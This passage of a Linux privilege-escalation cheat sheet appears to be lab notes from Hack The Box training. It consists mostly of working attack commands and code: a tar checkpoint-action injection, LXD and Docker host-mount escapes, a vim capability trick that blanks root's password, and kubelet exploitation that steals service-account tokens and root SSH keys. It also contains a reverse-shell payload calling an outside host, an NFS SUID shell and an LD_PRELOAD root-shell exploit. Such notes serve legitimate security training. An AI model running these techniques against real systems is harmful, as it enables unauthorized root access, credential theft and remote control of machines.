+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">24</span> root        root        <span class="m">4096</span> Aug <span class="m">31</span> 02:24 ..
+</span></span><span class="line"><span class="cl">-rw-r--r--  <span class="m">1</span> root        root         <span class="m">378</span> Aug <span class="m">31</span> 23:12 backup.tar.gz
+</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> htb-student htb-student    <span class="m">1</span> Aug <span class="m">31</span> 23:11 --checkpoint<span class="o">=</span><span class="m">1</span>
+</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> htb-student htb-student    <span class="m">1</span> Aug <span class="m">31</span> 23:11 --checkpoint-action<span class="o">=</span><span class="nv">exec</span><span class="o">=</span>sh root.sh
+</span></span><span class="line"><span class="cl">drwxrwxrwt  <span class="m">2</span> root        root        <span class="m">4096</span> Aug <span class="m">31</span> 22:36 .font-unix
+</span></span><span class="line"><span class="cl">drwxrwxrwt  <span class="m">2</span> root        root        <span class="m">4096</span> Aug <span class="m">31</span> 22:36 .ICE-unix
+</span></span><span class="line"><span class="cl">-rw-rw-r--  <span class="m">1</span> htb-student htb-student   <span class="m">60</span> Aug <span class="m">31</span> 23:11 root.sh</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Restricted shell resource :
+https://0xffsec.com/handbook/shells/restricted-shells/</li>
+</ul>
+<h3 id="permissions-based-privilege-escalation">Permissions-based Privilege Escalation<a href="#permissions-based-privilege-escalation" class="anchor" aria-hidden="true">#</a> </h3>
+<p><strong>Special Permissions</strong>
+#setgid_setuid</p>
+<ul>
+<li>Find Root setgid and <code>setuid</code> :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find / -user root -perm -4000 -exec ls -ldb <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="c1">#and</span>
+</span></span><span class="line"><span class="cl">find / -uid <span class="m">0</span> -perm -6000 -type f 2&gt;/dev/null</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Ressources :
+https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits</li>
+</ul>
+<p><strong>LXC / LXD Exploitation</strong>
+#LXC_LXD</p>
+<ol>
+<li>
+<p><strong>Group Membership:</strong></p>
+<ul>
+<li>User <code>devops</code> is a member of groups <code>devops</code> and <code>lxd</code>.</li>
+<li>Command:
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">id</span></span></code></pre></div>
+  </figure>
+</div>
+</li>
+<li>Output: <code>uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Unzipping Alpine Image:</strong></p>
+<ul>
+<li>Command:
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">unzip alpine.zip</span></span></code></pre></div>
+  </figure>
+</div>
+</li>
+<li>Output: Archive extraction details.</li>
+</ul>
+</li>
+<li>
+<p><strong>LXD Initialization:</strong></p>
+<ul>
+<li>
+<p>Command:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lxd init</span></span></code></pre></div>
+  </figure>
+</div>
+</li>
+<li>
+<p>Prompts:</p>
+<ul>
+<li>Configure new storage pool? (yes)</li>
+<li>Storage backend (dir)</li>
+<li>LXD over the network? (no)</li>
+<li>Configure LXD bridge? (yes)</li>
+</ul>
+</li>
+<li>
+<p>Error: <code>/usr/sbin/dpkg-reconfigure</code> must be run as root.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Import Local Image:</strong></p>
+<ul>
+<li>Command:
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</span></span></code></pre></div>
+  </figure>
+</div>
+</li>
+<li>Output: Image imported with fingerprint <code>be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Start Privileged Container:</strong></p>
+<ul>
+<li>Command:
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lxc init alpine r00t -c security.privileged<span class="o">=</span>true</span></span></code></pre></div>
+  </figure>
+</div>
+</li>
+<li>Output: Container <code>r00t</code> created.</li>
+</ul>
+</li>
+<li>
+<p><strong>Mount Host File System:</strong></p>
+<ul>
+<li>Command:
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lxc config device add r00t mydev disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span>true</span></span></code></pre></div>
+  </figure>
+</div>
+</li>
+<li>Output: Device <code>mydev</code> added to <code>r00t</code>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Spawn Shell Inside Container:</strong></p>
+<ul>
+<li>Commands:</li>
+</ul>
+</li>
+</ol>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lxc start r00t</span></span></code></pre></div>
+  </figure>
+</div>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lxc <span class="nb">exec</span> r00t /bin/sh</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Output: Access inside the container with root privileges.</li>
+</ul>
+<ol start="8">
+<li><strong>Docker Group Exploitation:</strong>
+<ul>
+<li>Members in the docker</li>
+<li>group have root-level access.</li>
+<li>Example Docker command:</li>
+</ul>
+</li>
+</ol>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">     docker run -v /root:/mnt -it ubuntu</span></span></code></pre></div>
+  </figure>
+</div>
+<ol start="9">
+<li>
+<p><strong>Disk Group Access:</strong></p>
+<ul>
+<li>Users in the disk group have full access to devices in <code>/dev</code>, like <code>/dev/sda1</code>.</li>
+<li>Example: Use <code>debugfs</code> to access the entire file system with root privileges.</li>
+</ul>
+</li>
+<li>
+<p><strong>ADM Group Access:</strong></p>
+<ul>
+<li>Members in the adm group can read all logs in <code>/var/log</code>.</li>
+<li>User <code>secaudit</code> is a member of groups <code>secaudit</code> and <code>adm</code>.</li>
+</ul>
+</li>
+</ol>
+<p><strong>Capabilities</strong>
+#Capabilities</p>
+<ul>
+<li>Enumerate Capabilities :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap <span class="o">{}</span> <span class="se">\;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Exploiting  Capabilities:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">getcap /usr/bin/vim.basic</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>We can use the <code>cap_dac_override</code> capability of the <code>/usr/bin/vim</code> binary to modify a system file:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">/usr/bin/vim.basic /etc/passwd</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>We also can make these changes in a non-interactive mode:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s1">&#39;:%s/^root:[^:]*:/root::/\nwq&#39;</span> <span class="p">|</span> /usr/bin/vim.basic -es /etc/passwd
+</span></span><span class="line"><span class="cl">cat /etc/passwd <span class="p">|</span> head -n1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">root::0:0:root:/root:/bin/bash</span></span></code></pre></div>
+  </figure>
+</div>
+<h3 id="service-based-privilege-escalation">Service-based Privilege Escalation<a href="#service-based-privilege-escalation" class="anchor" aria-hidden="true">#</a> </h3>
+<ul>
+<li>Writable files or directories:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Download pspy :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/DominicBreuker/pspy</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Run pspy :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">#print both commands and file system events and scan procfs every 1000 ms (=1sec)</span>
+</span></span><span class="line"><span class="cl">./pspy64 -pf -i <span class="m">1000</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p>**LXD **
+#LXD2</p>
+<ul>
+<li>Step 1:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+</span></span><span class="line"><span class="cl">lxc image list</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Step 2 :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lxc init ubuntutemp privesc -c security.privileged<span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">lxc config device add privesc host-root disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span>true</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Get a root shell :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">lxc start privesc
+</span></span><span class="line"><span class="cl">lxc <span class="nb">exec</span> privesc /bin/bash <span class="c1"># or sh for the command </span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Docker</strong>
+#Docker</p>
+<ul>
+<li>Create our own docker :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://master.dockerproject.org/linux/x86_64/docker
+</span></span><span class="line"><span class="cl">chmod +x docker
+</span></span><span class="line"><span class="cl">	docker -H unix:///app/docker.sock ps</span></span></code></pre></div>
+  </figure>
+</div>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+</span></span><span class="line"><span class="cl">docker -H unix:///app/docker.sock ps
+</span></span><span class="line"><span class="cl">docker -H unix:///app/docker.sock <span class="nb">exec</span> -it 7ae3bcc818af /bin/bash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat /hostsystem/root/.ssh/id_rsa</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Other way to privesc when the socket is writable  :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li><strong>&ndash;privileged<code> flag</code></strong></li>
+</ul>
+<p>The &ndash;privileged flag allows the container to have access to the host devices.</p>
+<p>Well configured docker containers won&rsquo;t allow command like <strong>fdisk -l</strong>. However on miss-configured docker command where the flag &ndash;privileged is specified, it is possible to get the privileges to see the host drive.</p>
+<p>So to take over the host machine, it is trivial:</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">mkdir -p /mnt/hola
+</span></span><span class="line"><span class="cl">mount /dev/sda1 /mnt/hola</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Need to be root to be able to mount .
+<strong>Bonus</strong>: If you want to know the container id it&rsquo;s located in /etc/hostname of the docker container</li>
+</ul>
+<p><strong>Kubernetes</strong>
+#Kubernetes</p>
+<ul>
+<li>Extracting Pods with anonymous access:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">curl https://10.129.10.11:10250/pods -k <span class="p">|</span> jq .
+</span></span><span class="line"><span class="cl"><span class="c1">#or </span>
+</span></span><span class="line"><span class="cl">kubeletctl -i --server 10.129.10.11 pods</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Available command :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"> kubeletctl -i --server 10.129.10.11 scan rce
+</span></span><span class="line"><span class="cl"> <span class="c1">#then get a root access</span>
+</span></span><span class="line"><span class="cl"> kubeletctl -i --server 10.129.10.11 <span class="nb">exec</span> <span class="s2">&#34;id&#34;</span> -p nginx -c nginx</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Extracting Tokens :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kubeletctl -i --server 10.129.10.11 <span class="nb">exec</span> <span class="s2">&#34;cat /var/run/secrets/kubernetes.io/serviceaccount/token&#34;</span> -p nginx -c nginx <span class="p">|</span> tee -a k8.token</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Extracting Certificate :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kubeletctl --server 10.129.10.11 <span class="nb">exec</span> <span class="s2">&#34;cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt&#34;</span> -p nginx -c nginx <span class="p">|</span> tee -a ca.crt</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>List Privileges</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">token</span><span class="o">=</span><span class="sb">`</span>cat k8.token<span class="sb">`</span>
+</span></span><span class="line"><span class="cl">kubectl --token<span class="o">=</span><span class="nv">$token</span> --certificate-authority<span class="o">=</span>ca.crt --server<span class="o">=</span>https://10.129.10.11:6443 auth can-i --list
+</span></span><span class="line"><span class="cl"><span class="c1">#output</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Resources										Non-Resource URLs	Resource Names	Verbs 
+</span></span><span class="line"><span class="cl">selfsubjectaccessreviews.authorization.k8s.io		<span class="o">[]</span>					<span class="o">[]</span>				<span class="o">[</span>create<span class="o">]</span>
+</span></span><span class="line"><span class="cl">selfsubjectrulesreviews.authorization.k8s.io		<span class="o">[]</span>					<span class="o">[]</span>				<span class="o">[</span>create<span class="o">]</span>
+</span></span><span class="line"><span class="cl">pods											    <span class="o">[]</span>					<span class="o">[]</span>				<span class="o">[</span>get create list<span class="o">]</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Create our own YAML pod :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">apiVersion</span><span class="p">:</span><span class="w"> </span><span class="l">v1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">kind</span><span class="p">:</span><span class="w"> </span><span class="l">Pod</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">metadata</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">privesc</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">namespace</span><span class="p">:</span><span class="w"> </span><span class="l">default</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">spec</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">containers</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">privesc</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l">nginx:1.14.2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">volumeMounts</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="nt">mountPath</span><span class="p">:</span><span class="w"> </span><span class="l">/root</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">mount-root-into-mnt</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">volumes</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">mount-root-into-mnt</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">hostPath</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="l">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">automountServiceAccountToken</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="nt">hostNetwork</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Creation new pod :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kubectl --token<span class="o">=</span><span class="nv">$token</span> --certificate-authority<span class="o">=</span>ca.crt --server<span class="o">=</span>https://10.129.96.98:6443 apply -f privesc.yaml
+</span></span><span class="line"><span class="cl">kubectl --token<span class="o">=</span><span class="nv">$token</span> --certificate-authority<span class="o">=</span>ca.crt --server<span class="o">=</span>https://10.129.96.98:6443 get pods
+</span></span><span class="line"><span class="cl"><span class="c1">#output</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">NAME	READY	STATUS	RESTARTS	AGE
+</span></span><span class="line"><span class="cl">nginx	1/1		Running	0			23m
+</span></span><span class="line"><span class="cl">privesc	1/1		Running	0			12s</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Extracting root ssh or make a reverse shell :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kubeletctl --server 10.129.10.11 <span class="nb">exec</span> <span class="s2">&#34;cat /root/root/.ssh/id_rsa&#34;</span> -p privesc -c privesc</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Logrotate</strong>
+#Logrotate</p>
+<ul>
+<li>Download logrotten :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">git clone https://github.com/whotwagner/logrotten.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> logrotten
+</span></span><span class="line"><span class="cl">gcc logrotten.c -o logrotten
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.2/9001 0&gt;&amp;1&#39;</span> &gt; payload</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>In our case, it is the option: <code>create</code>. Therefore we have to use the exploit adapted to this function:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">grep <span class="s2">&#34;create\|compress&#34;</span> /etc/logrotate.conf <span class="p">|</span> grep -v <span class="s2">&#34;#&#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Exploit:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">./logrotten -p ./payload /tmp/tmp.log</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Weak NFS Privileges :</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">showmount -e 10.129.2.12
+</span></span><span class="line"><span class="cl">cat /etc/exports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#no_root_squash</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>shell bit SUID :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="c1">#include &lt;stdio.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;sys/types.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;unistd.h&gt;</span>
+</span></span><span class="line"><span class="cl">int main<span class="o">(</span>void<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> system<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></div>
+  </figure>
+</div>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo mount -t nfs 10.129.2.12:/tmp /mnt
+</span></span><span class="line"><span class="cl">cp shell /mnt
+</span></span><span class="line"><span class="cl">chmod u+s /mnt/shell</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Hijacking Tmux :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">tmux -S /shareds new -s debugsess
+</span></span><span class="line"><span class="cl">chown root:devs /shareds
+</span></span><span class="line"><span class="cl">tmux -S /shareds</span></span></code></pre></div>
+  </figure>
+</div>
+<h3 id="linux-internals-based-privilege-escalation">Linux Internals-based Privilege Escalation<a href="#linux-internals-based-privilege-escalation" class="anchor" aria-hidden="true">#</a> </h3>
+<p><strong>LD_PRELOAD</strong>
+#LD_PRELOAD</p>
+<ul>
+<li>Exploit:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">_init</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="nf">unsetenv</span><span class="p">(</span><span class="s">&#34;LD_PRELOAD&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span>
